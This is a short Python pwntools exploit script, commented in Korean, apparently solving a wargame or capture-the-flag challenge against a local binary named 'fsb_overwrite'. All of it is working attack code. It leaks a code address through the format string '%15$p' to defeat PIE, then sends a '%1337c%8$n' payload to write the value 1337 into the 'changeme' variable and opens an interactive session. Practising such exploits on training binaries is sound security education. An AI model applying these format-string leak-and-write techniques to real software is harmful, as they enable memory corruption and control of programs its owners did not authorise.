#!/usr/bin/env python3
from pwn import *

def slog(label, addr):
    return success(f"{label}: {hex(addr)}")

# ========== 가변값 ==========
BIN_PATH = './fsb_overwrite'
LEAK_OFFSET = 0x1293  # PIE 기준으로 FSB로 누출된 주소에서 code_base까지의 오프셋
FSB_LEAK_FMT = b'%15$p'  # 릭할 때 쓸 포맷 문자열
FSB_WRITE_VAL = 1337
FSB_WRITE_ARG_IDX = 8    # %8$n에서 8번째 인자로 쓰일 위치
FSB_PADDING = b'A' * 6   # 스택 정렬 맞추기
# ===========================

def exploit():
    context.binary = BIN_PATH
    elf = ELF(BIN_PATH)
    p = process(BIN_PATH)

    # Step 1: PIE 기반 주소 leak → code base 계산
    p.sendline(FSB_LEAK_FMT)
    leaked = int(p.recvline().strip(), 16)
    code_base = leaked - LEAK_OFFSET
    changeme = code_base + elf.symbols['changeme']

    slog('code_base', code_base)
    slog('changeme', changeme)

    # Step 2: changeme 주소에 1337 값 덮기
    payload  = f"%{FSB_WRITE_VAL}c".encode()
    payload += f"%{FSB_WRITE_ARG_IDX}$n".encode()
    payload += FSB_PADDING
    payload += p64(changeme)

    p.sendline(payload)
    p.interactive()

if __name__ == '__main__':
    exploit()
